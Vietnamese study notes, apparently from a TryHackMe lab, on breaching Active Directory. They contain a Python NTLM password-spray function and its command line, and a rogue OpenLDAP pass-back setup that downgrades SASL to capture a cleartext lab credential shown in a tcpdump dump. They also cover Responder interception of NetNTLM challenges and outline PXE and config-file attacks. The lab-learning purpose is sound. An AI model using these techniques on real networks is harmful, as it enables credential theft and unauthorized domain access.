---
title: "Active Directory Breaches"
date: "2024-11-19"
excerpt: "Active Directory Breaches."
featured: "/images/ad_attack.jpg"
---

## Introduction to AD Breaches
---
Active Directory (AD) được sử dụng bởi 90% các công ty trong danh sách Global Fortune 1000. Vì AD được sử dụng để xác thực danh tính và quản lý truy cập => hay là mục tiêu bị tấn công

### Breaching Active Directory
---

1 số kĩ thuật:
- NTLM Authenticated Services
- LDAP Bind Credentials
- Authentication Relays
- Microsoft Deployment Toolkit
- Configuration Files

### OSINT và Phishing
---

2 phương thức để chiếm quyền truy cập vào tài khoản AD: Open Source Intelligence (OSINT) và Phishing.

__OSINT__
Được sử dụng để phát hiện thông tin mà được tiết lộ công khai, ví dụ vô tình tiết lộ tài khoản trên Github, Stack Overflow,...

__Phishing__

Vào web độc hại hay chạy 1 ứng dụng Trojan ở chế độ nền.

### NTLM Authenticated Services
---

__NTLM and NetNTLM__

New Technology LAN Manager (NTLM) là bộ các giao thức bảo mật để xác thực danh tính người dùng trong AD. NTLM xác thực bằng challenge-response schame hay còn gọi là NetNTLM. Cơ chế xác thực này được sử dụng nhiều, nhưng cũng có thể được expose trên mạng:
- Internally-hosted Exchange (Mail) servers expose expose an Outlook Web App (OWA) login
- Remote Desktop Protocol (RDP) service 
- Exposed VPN endpoints

NTLM đứng giữa client và server, xác thực thay cho người dùng => ngăn chặn ứng dụng lưu thông tin, chỉ DC mới lưu


![image](https://hackmd.io/_uploads/H1ddektzkl.png)


__Brute-force Login Attacks__

Thay vì brute-force nhiều mật khẩu cho 1 tài khoản (cấu hình khoá tài khoản), thì dùng 1 mật khẩu cho nhiều tài khoản. 

![image](https://hackmd.io/_uploads/Hy_oMkKMJg.png)


```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

__Password Spraying__


```cmd
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
```

Trong đó:
- fqdn: tên domain đầy đủ
- attackurl: url mà hỗ trợ window authentication

![image](https://hackmd.io/_uploads/S1RzNkYM1l.png)


### LDAP Bind Credentials
---

__LDAP__

1 phương thức để xác thực trong AD là Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication tương tự NTLM authentication. Với LDAP thì ứng dụng trực tiếp xác minh thông tin xác thực của user.

LDAP authentication là công cụ phổ biến với các ứng dụng bên thứ 3 tích hợp với AD:
- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs

![image](https://hackmd.io/_uploads/HyzO81Yz1e.png)


__LDAP Pass-back Attacks__

Là cuộc tấn công phổ biến vào các thiết bị mạng (máy in,...) khi ta đã có quyền truy cập vào mạng nội bộ. 
Tấn công LDAP Pass-back có thể được thực hiện khi chúng ta có quyền truy cập vào cấu hình thiết bị có chỉ định các tham số LDAP.

Ở đây, không thể truy xuất trực tiếp LDAP credentials vì password thường bị ẩn. Tuy nhiên có thể thay đổi cấu hình LDAP (IP, tên máy chủ,...) => các thiết bị kia xác thực LDAP với thiết bị giả mạo.

__Performing an LDAP Pass-back__

Ví dụ này để sẵn luôn tài khoản, mật khẩu, nhưng không thể xem mật khẩu.

![image](https://hackmd.io/_uploads/HJLidyYfke.png)

![image](https://hackmd.io/_uploads/r13COJKf1e.png)

`nc -lvp 389`

Sau đó gặp lỗi như này 

```
[thm@thm]$ nc -lvp 389
listening on [any] 389 ...
10.10.10.201: inverse host lookup failed: Unknown host
connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765
0?DC?;
?
?x
 objectclass0?supportedCapabilities      
```

Hơn nữa dữ liệu truyển đi có thể ở dạng văn bản không thuần tuý => Ta tạo một LDAP server giả mạo và cấu hình cho nó không an toàn => gửi dữ liệu cleartext.

__Hosting a Rogue LDAP Server__

Sử dụng OpenLDAP

```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

`sudo dpkg-reconfigure -p low slapd
`

![image](https://hackmd.io/_uploads/ryvGiytfJe.png)

Sau đó nhập target domain name

![image](https://hackmd.io/_uploads/HynXoJFMyx.png)

Sau đó sử dụng cùng tên Organisation

![image](https://hackmd.io/_uploads/rJjSjyYfJx.png)

![image](https://hackmd.io/_uploads/HyBIoJFM1l.png)

Chọn MDB as the LDAP database

![image](https://hackmd.io/_uploads/ByowskKfJx.png)

![image](https://hackmd.io/_uploads/SJsdjktzJg.png)

Trước khi sử dụng LDAP giả mạo, cần hạ cấp (khiến cho có lỗ hổng) hỗ trợ công cụ xác thực => plaintext. Để làm điều đó, ta tạo file ldif:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
Trong đó:
- olcSaslSecProps: chỉ định thuộc tính bảo mật SASL
- noanonymous: disable công cụ hỗ trợ đăng nhập ẩn danh
- minssf: mức độ bảo vệ: 0


patch our LDAP server
```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

Xác minh xem máy chủ LDAP OK chưa

```
[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

__Capturing LDAP Credentials__

![image](https://hackmd.io/_uploads/ry2z01tGJe.png)

Khi bị lỗi này, bật tcpdump

```
[thm@thm]$ sudo tcpdump -SX -i breachad tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:41:52.979933 IP 10.10.10.201.49834 > 10.10.10.57.ldap: Flags [P.], seq 4245946075:4245946151, ack 1113052386, win 8212, length 76
	0x0000:  4500 0074 b08c 4000 8006 20e2 0a0a 0ac9  E..t..@.........
	0x0010:  0a0a 0a39 c2aa 0185 fd13 fedb 4257 d4e2  ...9........BW..
	0x0020:  5018 2014 1382 0000 3084 0000 0046 0201  P.......0....F..
	0x0030:  0263 8400 0000 3d04 000a 0100 0a01 0002  .c....=.........
	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
	0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
	0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
	0x0070:  6973 6d73                                isms
10:41:52.979938 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [.], ack 4245946151, win 502, length 0
	0x0000:  4500 0028 247d 4000 4006 ed3d 0a0a 0a39  E..($}@.@..=...9
	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'
	0x0020:  5010 01f6 2930 0000                      P...)0..
10:41:52.980162 IP 10.10.10.57.ldap > 10.10.10.201.49834: Flags [P.], seq 1113052386:1113052440, ack 4245946151, win 502, length 54
	0x0000:  4500 005e 247e 4000 4006 ed06 0a0a 0a39  E..^$~@.@......9
	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'
	0x0020:  5018 01f6 2966 0000 3034 0201 0264 2f04  P...)f..04...d/.
	0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported
	0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.
	0x0050:  0405 504c 4149 4e04 054c 4f47 494e       ..PLAIN..LOGIN
[....]
10:41:52.987145 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [.], ack 3088612909, win 8212, length 0
	0x0000:  4500 0028 b092 4000 8006 2128 0a0a 0ac9  E..(..@...!(....
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5010 2014 0ae4 0000 0000 0000 0000       P.............
10:41:52.989165 IP 10.10.10.201.49835 > 10.10.10.57.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65
	0x0000:  4500 0069 b093 4000 8006 20e6 0a0a 0ac9  E..i..@.........
	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-
	0x0020:  5018 2014 3afe 0000 3084 0000 003b 0201  P...:...0....;..
	0x0030:  0560 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t
	0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..password11
```


### Authentication Replays

NetNTLM authentication used by SMB.

__Server Message Block__

Là giao thức cho phép clients giao tiếp với server. Trong các mạng sử dụng Microsoft AD, SMB quản lý mọi thứ từ chia sẻ file giữa các mạng và quản trị từ xa.
Một số version cũ của SMB có lỗ hổng.

2 cách exploit khác nhau cho NetNTLM authentication với SMB:
- Khi NTLM Challenges bị chặn, sử dụng tool offline để phục hồi password cùng với NTLM Challenges. Tuy nhiên thì quá trình bẻ khoá này chậm hơn đáng kể so với bẻ khoá trực tiếp mã băm NTLM.
- Sử dụng 1 thiết bị của mình để đứng giữa, chuyển tiếp SMB authentication giữa client và server => cung cấp active authenticated session.

__LLMNR, NBT-NS, và WPAD__

Sử dụng `responder` để chặn NetNTLM challenge và crack nó. Như Man-in-the-Middle attacks.

Trong real LAN, Responder nhiễm các requests Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), và Web Proxy Auto-Discovery (WPAD) mà được phát hiện.

Thông thường, những requests sẽ bị loại bỏ do không dành cho ta, tuy nhiên `Responder` chủ động lắng nghe các requests và gửi response độc hại.

__Intercepting NetNTLM Challenge__

https://github.com/lgandx/Responder.

`sudo responder -I breachad`

![image](https://hackmd.io/_uploads/r1_cUgYMyl.png)


__Relaying the Challenge__

![image](https://hackmd.io/_uploads/SkgxKuetGye.png)


### Microsoft Deployment Toolkit
---

__MDT and SCCM__

Microsoft Deployment Toolkit (MDT) là dịch vụ của Microsoft hỗ trợ tự động deploy Microsoft Operating Systems (OS).

MDT tích hợp  Microsoft's System Center Configuration Manager (SCCM), mà nó quản lý các bản cập nhật ứng dụng, dịch vụ, hệ điều hành Windows,...

__PXE Boot__

Được sử dụng để cho phép các thiết bị mới được kết nối vào mạng và tải hệ điều hành trực tiếp qua mạng. MDT có thể được sử dụng để tạo, quản lý hay host PXE host images. PXE tích hợp DHCP.

![image](https://hackmd.io/_uploads/r1cfqgKfkg.png)

Tấn công:
- Tiêm một vectơ leo thang đặc quyền, chẳng hạn như tài khoản Quản trị viên cục bộ, để có quyền truy cập Quản trị vào HĐH sau khi quá trình khởi động PXE hoàn tất.
- Thực hiện các cuộc tấn công lấy cắp mật khẩu để khôi phục thông tin xác thực AD được sử dụng trong quá trình cài đặt.

__PXE Boot Image Retrieval__

Nếu DHCP khó tính -> bypass


### Configuration Files

Web application config files
Service configuration files
Registry keys
Centrally deployed applications







